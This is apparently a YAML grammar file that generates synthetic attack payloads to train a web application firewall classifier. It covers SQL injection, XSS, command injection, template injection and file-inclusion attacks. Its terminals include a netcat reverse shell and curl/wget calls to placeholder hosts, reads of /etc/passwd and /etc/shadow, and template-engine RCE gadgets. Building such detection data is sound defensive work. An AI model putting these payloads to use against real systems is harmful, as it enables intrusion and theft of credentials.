# ─────────────────────────────────────────────────────────────────────────────
# Recursive PCFG grammars for synthetic attack payloads (Stage 3.1).
#
# Loaded by ai_waf_v2.augment.pcfg.load_pcfg_grammars() and sampled by
# PcfgGenerator in stages/3_data_augmentation/01_attack_synthesis.py.
#
# Only the attack classes listed here use the recursive engine; every other
# class falls back to the flat prefix+payload+suffix templates in
# GRAMMAR_REGISTRY. Delete this file (or a class) to fall back entirely.
#
# Symbol tokens inside a production body:
#   "t:<literal>"  terminal text (quote to preserve leading/trailing spaces)
#   "n:<NAME>"     nonterminal reference  → recursion
#   "f:<func>"     callable terminal from ai_waf_v2.augment.pcfg.PCFG_FUNCS
#                  (small, structural vocab: event-handler names, tag names)
#   "openq"        pick a quote char, remember it, emit it
#   "closeq"       emit the quote remembered by the most recent "openq"
# A production is [weight, [token, token, ...]].
#
# FILLER PLACEHOLDERS  "§NAME§"  (inside terminal text):
#   Incidental, attacker-chosen values — hostnames, ports, ids, numbers, JS
#   bodies — are written as placeholders, NOT literals, and are substituted at
#   synthesis time by ai_waf_v2.augment.fillers (high-cardinality, and shared
#   with benign generation) so the token carries no label signal. Available:
#   §HOST§ §IP§ §PORT§ §PATH§ §PARAM§ §IDENT§ §STR§ §INT§ §COL§ §WORD§ §JS_BODY§.
#   Use §NAME#TAG§ to make repeated occurrences resolve to one value per payload.
#   Structural tokens that define the attack class (SQL keywords, ../, /etc/passwd,
#   <script>, event handlers, template delimiters, RCE gadgets) stay as literals.
# ─────────────────────────────────────────────────────────────────────────────

pcfg_grammars:

  sqli:
    start: START
    max_depth: 6
    max_len: 256
    rules:
      START:
        - [0.6, ["n:INJ", "t: ", "n:COMMENT"]]
        - [0.4, ["n:INJ"]]
      INJ:
        - [0.35, ["openq", "t: ", "n:BOOL"]]
        - [0.25, ["openq", "t: UNION SELECT ", "n:COLS"]]
        - [0.20, ["t:1 ", "n:BOOL"]]
        - [0.20, ["n:BOOL"]]
      BOOL:                                    # recursive: chained / nested clauses
        - [0.45, ["n:COND"]]
        - [0.20, ["n:BOOL", "t: OR ", "n:BOOL"]]
        - [0.20, ["n:BOOL", "t: AND ", "n:BOOL"]]
        - [0.15, ["t:(", "n:BOOL", "t:)"]]
      COND:
        - [0.30, ["t:1=1"]]
        - [0.20, ["t:1=2"]]
        - [0.20, ["t:§COL§=§COL§"]]
        - [0.15, ["t:§COL§=", "n:STRLIT"]]
        - [0.15, ["t:SLEEP(§INT§)"]]
      COLS:                                    # recursive: variable-width column list
        - [0.45, ["t:NULL"]]
        - [0.15, ["t:§COL§"]]
        - [0.25, ["t:NULL,", "n:COLS"]]
        - [0.15, ["t:§COL§,", "n:COLS"]]
      STRLIT:                                  # matched quotes via openq/closeq
        - [1.0, ["openq", "t:§STR§", "closeq"]]
      COMMENT:
        - [0.4, ["t:-- "]]
        - [0.3, ["t:#"]]
        - [0.2, ["t:/*"]]
        - [0.1, ["t:"]]

  xss:
    start: START
    max_depth: 7
    max_len: 256
    rules:
      START:
        - [0.45, ["n:VECTOR"]]                      # reflected into an HTML text context
        - [0.35, ["n:BREAKOUT", "n:VECTOR"]]        # break out of a quoted attribute, then inject
        - [0.20, ["n:ATTR_INJECT"]]                 # inject an event handler into the current tag
      BREAKOUT:                                     # close a quoted attribute value + its tag
        - [0.5, ['t:">']]
        - [0.5, ["t:'>"]]
      ATTR_INJECT:                                  # e.g.  " onmouseover=<js> x="
        - [0.5, ['t:" ', "f:xss_evt", "t:=", "n:JS", 't: x="']]
        - [0.5, ["t:' ", "f:xss_evt", "t:=", "n:JS", "t: x='"]]
      VECTOR:
        - [0.24, ["t:<script>", "n:JS", "t:</script>"]]
        - [0.18, ["t:<img src=x ", "f:xss_evt", "t:=", "n:JS", "t:>"]]
        - [0.14, ["t:<svg ", "f:xss_evt", "t:=", "n:JS", "t:>"]]
        - [0.12, ["t:<body ", "f:xss_evt", "t:=", "n:JS", "t:>"]]
        - [0.10, ["t:<iframe src=javascript:", "n:JS", "t:>"]]
        - [0.10, ["t:<a href=javascript:", "n:JS", "t:>x</a>"]]
        - [0.12, ["t:<", "f:xss_tag", "t:>", "n:VECTOR", "t:</", "f:xss_tag", "t:>"]]  # recursive: nested wrapper tags
      JS:                                           # JS body is incidental → filler; chaining is structural
        - [0.55, ["t:§JS_BODY§"]]
        - [0.45, ["t:§JS_BODY§;", "n:JS"]]          # recursive: chained statements

  cmdi:
    start: START
    max_depth: 6
    max_len: 256
    rules:
      START:                                        # injected into an existing shell command
        - [0.5, ["n:SEP", "n:CMD"]]
        - [0.3, ["n:SEP", "n:CMD", "n:START"]]      # recursive: chained commands
        - [0.2, ["n:SEP", "n:CMD", "n:REDIR"]]
      SEP:                                          # each guarantees a shell metachar/newline
        - [0.30, ["t:; "]]
        - [0.25, ["t:| "]]
        - [0.15, ["t:|| "]]
        - [0.15, ["t:&& "]]
        - [0.15, ["t:\n"]]
      CMD:
        - [0.30, ["n:BIN"]]
        - [0.20, ["n:BIN", "t: ", "n:ARG"]]
        - [0.15, ["t:cat ", "n:FILE"]]
        - [0.13, ["t:curl http://§HOST§/§WORD§"]]
        - [0.10, ["t:wget http://§HOST§"]]
        - [0.07, ["t:nc -e /bin/sh §HOST§ §PORT§"]]
        - [0.05, ["n:SUBST"]]                       # command substitution as a command
      BIN:
        - [0.2, ["t:id"]]
        - [0.2, ["t:whoami"]]
        - [0.15, ["t:uname -a"]]
        - [0.15, ["t:ls -la"]]
        - [0.1, ["t:ps aux"]]
        - [0.1, ["t:env"]]
        - [0.1, ["t:hostname"]]
      ARG:
        - [0.5, ["t:§WORD§"]]
        - [0.3, ["n:SUBST"]]                        # e.g.  ping $(whoami)
        - [0.2, ["t:§WORD§ ", "n:ARG"]]             # recursive: multiple args
      SUBST:                                        # balanced command substitution
        - [0.5, ["t:$(", "n:CMD", "t:)"]]           # recursive via CMD
        - [0.5, ["t:`", "n:CMD", "t:`"]]            # recursive via CMD
      REDIR:
        - [0.4, ["t: > /dev/null 2>&1"]]
        - [0.3, ["t: 2>&1"]]
        - [0.3, ["t: #"]]
      FILE:
        - [0.4, ["t:/etc/passwd"]]
        - [0.3, ["t:/etc/shadow"]]
        - [0.3, ["t:/proc/self/environ"]]

  ssti:
    start: START
    max_depth: 7
    max_len: 256
    rules:
      START:                                        # pick a template-engine syntax
        - [0.5, ["n:JINJA"]]
        - [0.15, ["n:DOLLAR"]]
        - [0.15, ["n:HASH"]]
        - [0.10, ["n:ERB"]]
        - [0.10, ["n:SPRING"]]
      JINJA:
        - [1.0, ["t:{{", "n:EXPR", "t:}}"]]
      DOLLAR:
        - [0.5, ["t:${", "n:ARITH", "t:}"]]
        - [0.5, ["t:${", "n:GADGET", "t:}"]]
      HASH:
        - [0.6, ["t:#{", "n:ARITH", "t:}"]]
        - [0.4, ["t:#{", "n:GADGET", "t:}"]]
      ERB:
        - [0.5, ["t:<%= ", "n:ARITH", "t: %>"]]
        - [0.5, ["t:<%= system('id') %>"]]
      SPRING:
        - [0.6, ["t:*{", "n:ARITH", "t:}"]]
        - [0.4, ["t:@(", "n:ARITH", "t:)"]]
      EXPR:
        - [0.3, ["n:ARITH"]]
        - [0.4, ["n:BASE", "n:ACCESS"]]             # attribute/index chain (recursive)
        - [0.3, ["n:GADGET"]]
      ARITH:
        - [0.5, ["t:§INT§*§INT§"]]
        - [0.5, ["t:7*7"]]
      BASE:
        - [0.3, ["t:config"]]
        - [0.3, ["t:request"]]
        - [0.2, ["t:''"]]
        - [0.2, ["t:self"]]
      ACCESS:                                       # recursive: .attr and [key] chains
        - [0.4, ["t:"]]                             # base case: end the chain
        - [0.3, ["t:.", "n:ATTR", "n:ACCESS"]]
        - [0.3, ["t:[", "n:KEY", "t:]", "n:ACCESS"]]
      ATTR:
        - [0.25, ["t:__class__"]]
        - [0.25, ["t:__globals__"]]
        - [0.2, ["t:__mro__"]]
        - [0.15, ["t:__subclasses__()"]]
        - [0.15, ["t:__init__"]]
      KEY:
        - [0.5, ["t:'os'"]]
        - [0.3, ["t:'__builtins__'"]]
        - [0.2, ["t:§INT§"]]
      GADGET:                                       # known RCE one-liners
        - [0.5, ["t:''.__class__.__mro__[2].__subclasses__()"]]
        - [0.3, ["t:request.application.__globals__.__builtins__.__import__('os').popen('id').read()"]]
        - [0.2, ["t:config.items()"]]

  # lfi and path_traversal share one grammar (identical structure) via a YAML anchor.
  # Targets are the *semantic content* of the attack (sensitive files), so they stay
  # as literals rather than fillers — the model should learn them.
  lfi: &lfi_path_traversal
    start: START
    max_depth: 8
    max_len: 256
    rules:
      START:
        - [0.55, ["n:TRAVERSAL", "n:TARGET", "n:SUFFIX"]]   # ../../ + target
        - [0.25, ["n:WRAPPER"]]                             # php:// / data:// stream wrappers
        - [0.20, ["n:ABS", "n:SUFFIX"]]                     # absolute path
      TRAVERSAL:                                            # recursive: variable depth
        - [0.45, ["n:DOTDOT", "n:TRAVERSAL"]]
        - [0.55, ["n:DOTDOT"]]
      DOTDOT:                                               # each matches the LFI token set
        - [0.5, ["t:../"]]
        - [0.3, ["t:..\\"]]
        - [0.2, ["t:....//"]]
      TARGET:
        - [0.4, ["t:etc/passwd"]]
        - [0.25, ["t:etc/shadow"]]
        - [0.2, ["t:proc/self/environ"]]
        - [0.15, ["t:var/log/apache2/access.log"]]
      ABS:
        - [0.4, ["t:/etc/passwd"]]
        - [0.3, ["t:/proc/self/environ"]]
        - [0.3, ["t:/etc/shadow"]]
      WRAPPER:
        - [0.5, ["t:php://filter/convert.base64-encode/resource=", "n:ABS"]]
        - [0.3, ["t:php://input"]]
        - [0.2, ["t:data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+"]]
      SUFFIX:
        - [0.5, ["t:"]]
        - [0.25, ["t:%00"]]
        - [0.15, ["t:.php"]]
        - [0.1, ["t:%00.jpg"]]

  path_traversal: *lfi_path_traversal
